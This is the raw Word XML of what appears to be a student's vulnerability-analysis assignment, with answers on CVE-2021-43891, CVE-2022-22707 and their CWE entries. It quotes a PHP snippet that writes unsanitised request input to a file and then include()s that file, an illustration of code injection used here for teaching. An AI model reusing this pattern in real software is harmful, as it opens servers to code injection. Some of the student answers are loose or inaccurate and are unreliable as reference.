      <w:r>
        <w:t xml:space="preserve">Under </w:t>
      </w:r>
      <w:r w:rsidRPr="006F2770">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Microsoft vulnerabilities statistics</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006F2770">
        <w:t xml:space="preserve">page </w:t>
      </w:r>
      <w:r>
        <w:t>click on the highest vulnerability type and analyze the results</w:t>
      </w:r>
      <w:r w:rsidR="006F2770">
        <w:t xml:space="preserve">. Analyze one </w:t>
      </w:r>
      <w:r w:rsidR="00216E49">
        <w:t xml:space="preserve">of the latest Microsoft </w:t>
      </w:r>
      <w:r w:rsidR="006F2770">
        <w:t>vulnerability and provide the following information:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61E852A5" w14:textId="4DA7E6FF" w:rsidR="006F2770" w:rsidRDefault="006F2770" w:rsidP="006F2770">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>CVE ID</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D5597E2" w14:textId="04AA875A" w:rsidR="002D3357" w:rsidRPr="002D3357" w:rsidRDefault="002D3357" w:rsidP="002D3357">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CVE-2021-43891</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2270CB5C" w14:textId="2C0072BB" w:rsidR="006F2770" w:rsidRDefault="006F2770" w:rsidP="006F2770">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>CWE ID</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="283E395D" w14:textId="2B410168" w:rsidR="002D3357" w:rsidRPr="002D3357" w:rsidRDefault="002D3357" w:rsidP="002D3357">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>94</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A289B42" w14:textId="1D173421" w:rsidR="006F2770" w:rsidRDefault="006F2770" w:rsidP="006F2770">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Vulnerability Type Published day</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E37A4D1" w14:textId="01A39330" w:rsidR="002D3357" w:rsidRPr="002D3357" w:rsidRDefault="002D3357" w:rsidP="002D3357">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>2021-12-15</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B604484" w14:textId="6584371E" w:rsidR="006F2770" w:rsidRDefault="006F2770" w:rsidP="006F2770">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Score</w:t>
      </w:r>
      <w:r w:rsidR="006561D2">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CD654E9" w14:textId="7B52464A" w:rsidR="006561D2" w:rsidRDefault="006561D2" w:rsidP="006561D2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2520"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To analyze the meaning of the score access </w:t>
      </w:r>
      <w:hyperlink r:id="rId13" w:history="1">
        <w:r w:rsidR="00A36592" w:rsidRPr="00F643EF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://nvd.nist.gov/vuln-metrics/cvss#</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00A428FF">
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E5F8B62" w14:textId="44970A15" w:rsidR="002D3357" w:rsidRPr="002D3357" w:rsidRDefault="002D3357" w:rsidP="006561D2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2520"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>6.8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C4364AC" w14:textId="77777777" w:rsidR="006561D2" w:rsidRDefault="006561D2" w:rsidP="006561D2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2520"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="055CDBFB" w14:textId="2CEF92CA" w:rsidR="006F2770" w:rsidRDefault="006F2770" w:rsidP="00BC7CED">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="39"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Access</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D96600D" w14:textId="713B0F8C" w:rsidR="006F2770" w:rsidRDefault="006F2770" w:rsidP="00BC7CED">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="39"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Complexity</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DDF0E78" w14:textId="304F9946" w:rsidR="006F2770" w:rsidRDefault="006F2770" w:rsidP="00BC7CED">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="39"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Authentication</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01D054BD" w14:textId="01C7B125" w:rsidR="006F2770" w:rsidRDefault="006F2770" w:rsidP="00BC7CED">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="39"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Confidentiality, Integrity and availabil</w:t>
      </w:r>
      <w:r w:rsidR="00A87DB0">
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ty</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47661D90" w14:textId="77777777" w:rsidR="00D11C1A" w:rsidRDefault="00D11C1A" w:rsidP="00D11C1A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1800"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75C448AB" w14:textId="77777777" w:rsidR="006F2770" w:rsidRDefault="006F2770" w:rsidP="006F2770">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To find weakness details for this vulnerability click on CWE ID or access the CWE database </w:t>
      </w:r>
      <w:hyperlink r:id="rId14" w:history="1">
        <w:r w:rsidRPr="00F643EF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://cwe.mitre.org/data/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> and under ID Lookup enter the CWE ID. Provide the following information about the weakness:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61B076B2" w14:textId="4002752F" w:rsidR="00A36592" w:rsidRDefault="006F2770" w:rsidP="00123EC6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006561D2">
        <w:t>Brief description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39566132" w14:textId="2009CD5F" w:rsidR="00A74809" w:rsidRPr="00A74809" w:rsidRDefault="00A74809" w:rsidP="00A74809">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>A remote code execution vulnerability for visual studio code</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E310272" w14:textId="331872F4" w:rsidR="00A36592" w:rsidRDefault="006561D2" w:rsidP="00123EC6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> Scope and impact (summarize)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BFED262" w14:textId="4C7DA2F9" w:rsidR="00A74809" w:rsidRPr="00A74809" w:rsidRDefault="00A74809" w:rsidP="00A74809">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Scope is limited but some system files/information are open to modification.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67F2689C" w14:textId="0AE21515" w:rsidR="006561D2" w:rsidRDefault="00A36592" w:rsidP="006F2770">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A87DB0">
        <w:t xml:space="preserve">Analyze at least one example of code </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="436A40D3" w14:textId="77777777" w:rsidR="00A74809" w:rsidRPr="00A74809" w:rsidRDefault="00A74809" w:rsidP="00A74809">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A74809">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>$MessageFile = "messages.out";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E45C5AD" w14:textId="77777777" w:rsidR="00A74809" w:rsidRPr="00A74809" w:rsidRDefault="00A74809" w:rsidP="00A74809">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A74809">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>if ($_GET["action"] == "NewMessage") {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35BD74AF" w14:textId="77777777" w:rsidR="00A74809" w:rsidRPr="00A74809" w:rsidRDefault="00A74809" w:rsidP="00A74809">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A74809">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>$name = $_GET["name"];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40323A8F" w14:textId="77777777" w:rsidR="00A74809" w:rsidRPr="00A74809" w:rsidRDefault="00A74809" w:rsidP="00A74809">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A74809">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>$message = $_GET["message"];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61FD69BF" w14:textId="77777777" w:rsidR="00A74809" w:rsidRPr="00A74809" w:rsidRDefault="00A74809" w:rsidP="00A74809">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A74809">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>$handle = fopen($MessageFile, "a+");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51CEB082" w14:textId="77777777" w:rsidR="00A74809" w:rsidRPr="00A74809" w:rsidRDefault="00A74809" w:rsidP="00A74809">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A74809">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>fwrite($handle, "&lt;b&gt;$name&lt;/b&gt; says '$message'&lt;hr&gt;\n");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01564931" w14:textId="77777777" w:rsidR="00A74809" w:rsidRPr="00A74809" w:rsidRDefault="00A74809" w:rsidP="00A74809">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A74809">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>fclose($handle);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="664287BC" w14:textId="77777777" w:rsidR="00A74809" w:rsidRPr="00A74809" w:rsidRDefault="00A74809" w:rsidP="00A74809">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A74809">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>echo "Message Saved!&lt;p&gt;\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="215E1436" w14:textId="77777777" w:rsidR="00A74809" w:rsidRPr="00A74809" w:rsidRDefault="00A74809" w:rsidP="00A74809">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A74809">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="313A238D" w14:textId="77777777" w:rsidR="00A74809" w:rsidRPr="00A74809" w:rsidRDefault="00A74809" w:rsidP="00A74809">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A74809">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>else if ($_GET["action"] == "ViewMessages") {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E729A16" w14:textId="77777777" w:rsidR="00A74809" w:rsidRPr="00A74809" w:rsidRDefault="00A74809" w:rsidP="00A74809">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A74809">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>include($MessageFile);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E4F8C51" w14:textId="3D43CE6D" w:rsidR="00A74809" w:rsidRDefault="00A74809" w:rsidP="00A74809">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A74809">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D52F506" w14:textId="290F728C" w:rsidR="00A74809" w:rsidRPr="00A74809" w:rsidRDefault="00A74809" w:rsidP="00A74809">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>In this example</w:t>
      </w:r>
      <w:r w:rsidR="006110B8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> the hacker can inject code into the MessageFile running something potential</w:t>
      </w:r>
      <w:r w:rsidR="007076A2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>ly</w:t>
      </w:r>
      <w:r w:rsidR="006110B8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> malicious.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F9B48C6" w14:textId="26C6129A" w:rsidR="00A36592" w:rsidRDefault="00A36592" w:rsidP="006F2770">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>If provided analyze potential mitigations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29EF406A" w14:textId="11FEF460" w:rsidR="006110B8" w:rsidRPr="006110B8" w:rsidRDefault="006110B8" w:rsidP="006110B8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Assuming all input is malicious and preventing that malicious input (such as by running the program isolated from important systems) is the best way to prevent things like this</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20A67CFA" w14:textId="77777777" w:rsidR="00A87DB0" w:rsidRDefault="00A87DB0" w:rsidP="00A36592"/>
    <w:p w14:paraId="2EF8F949" w14:textId="1150DFC3" w:rsidR="002344D7" w:rsidRDefault="00BC7CED" w:rsidP="00123EC6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="29"/>
        </w:numPr>
        <w:ind w:left="1440"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>( 5</w:t>
      </w:r>
      <w:r w:rsidR="00A428FF" w:rsidRPr="00D84304">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> Marks)</w:t>
      </w:r>
      <w:r w:rsidR="00A428FF">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D0432A">
        <w:t>P</w:t>
      </w:r>
      <w:r w:rsidR="00A36592">
        <w:t xml:space="preserve">erform similar </w:t>
      </w:r>
      <w:r w:rsidR="00D0432A">
        <w:t xml:space="preserve">analysis for </w:t>
      </w:r>
      <w:r w:rsidR="00A36592">
        <w:t xml:space="preserve">current </w:t>
      </w:r>
      <w:r w:rsidR="00A36592" w:rsidRPr="002A7D62">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Linux vulnerabilities</w:t>
      </w:r>
      <w:r w:rsidR="00A36592">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006561D2">
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r w:rsidR="00D84304">
        <w:t>provide the following:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3452D140" w14:textId="41BABE9A" w:rsidR="002A7D62" w:rsidRDefault="002A7D62" w:rsidP="00123EC6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">CVE ID </w:t>
      </w:r>
      <w:r w:rsidR="00BC7CED">
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r>
        <w:t>CWE ID</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="342EE001" w14:textId="1C8E7EE5" w:rsidR="00C17DBB" w:rsidRDefault="00C17DBB" w:rsidP="00C17DBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CVE-2022-22707</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21A6CC51" w14:textId="0670DBDB" w:rsidR="00C17DBB" w:rsidRPr="00C17DBB" w:rsidRDefault="00C17DBB" w:rsidP="00C17DBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CWE-787</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="683250E6" w14:textId="1BC576C1" w:rsidR="002A7D62" w:rsidRDefault="002A7D62" w:rsidP="002A7D62">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Vulnerability Type Published day</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0169981E" w14:textId="2CC0CBC6" w:rsidR="00291CC6" w:rsidRPr="00291CC6" w:rsidRDefault="00291CC6" w:rsidP="00291CC6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>2022-01-06</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D5680C9" w14:textId="7B564241" w:rsidR="002A7D62" w:rsidRDefault="002A7D62" w:rsidP="002A7D62">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Score </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3738BF92" w14:textId="7432ED5C" w:rsidR="00291CC6" w:rsidRPr="00291CC6" w:rsidRDefault="00291CC6" w:rsidP="00291CC6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>4.3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A979B2D" w14:textId="77777777" w:rsidR="002A7D62" w:rsidRDefault="002A7D62" w:rsidP="002A7D62">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2520"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">To analyze the meaning of the score access </w:t>
      </w:r>
      <w:hyperlink r:id="rId15" w:history="1">
        <w:r w:rsidRPr="00F643EF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://nvd.nist.gov/vuln-metrics/cvss#</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1528E671" w14:textId="77777777" w:rsidR="002A7D62" w:rsidRDefault="002A7D62" w:rsidP="002A7D62">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2520"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D1D2F67" w14:textId="77777777" w:rsidR="002A7D62" w:rsidRDefault="002A7D62" w:rsidP="00BC7CED">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Access</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43B05EA8" w14:textId="77777777" w:rsidR="002A7D62" w:rsidRDefault="002A7D62" w:rsidP="00BC7CED">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Complexity</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="602C1D82" w14:textId="77777777" w:rsidR="002A7D62" w:rsidRDefault="002A7D62" w:rsidP="00BC7CED">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Authentication</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1774F333" w14:textId="77777777" w:rsidR="002A7D62" w:rsidRDefault="002A7D62" w:rsidP="00BC7CED">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Confidentiality, Integrity and availability</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F403113" w14:textId="77777777" w:rsidR="00D84304" w:rsidRDefault="00D84304" w:rsidP="006561D2">
      <w:pPr>
        <w:ind w:left="1440"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D8BDB25" w14:textId="4C9BDFFA" w:rsidR="00A8750E" w:rsidRDefault="00A8750E" w:rsidP="00667CF5">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>( 5</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB3EA3">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> marks)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Access MITRE web site </w:t>
      </w:r>
      <w:hyperlink r:id="rId16" w:history="1">
        <w:r w:rsidRPr="00C10352">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://cve.mitre.org/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="00667CF5">
        <w:t xml:space="preserve">or </w:t>
      </w:r>
      <w:hyperlink r:id="rId17" w:history="1">
        <w:r w:rsidR="00667CF5" w:rsidRPr="00C10352">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://support.microsoft.com/en-us/help/4571741/windows-10-update-kb4571741</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00667CF5">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and identify the newest CVE entries and provide the following information:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79630330" w14:textId="650BA90B" w:rsidR="00A8750E" w:rsidRDefault="00A8750E" w:rsidP="00A8750E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>CVE ID</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B60EF1B" w14:textId="5C802AA8" w:rsidR="009865DB" w:rsidRPr="009865DB" w:rsidRDefault="009865DB" w:rsidP="009865DB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009865DB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CVE-2020-1036</w:t>
      </w:r>
    </w:p>
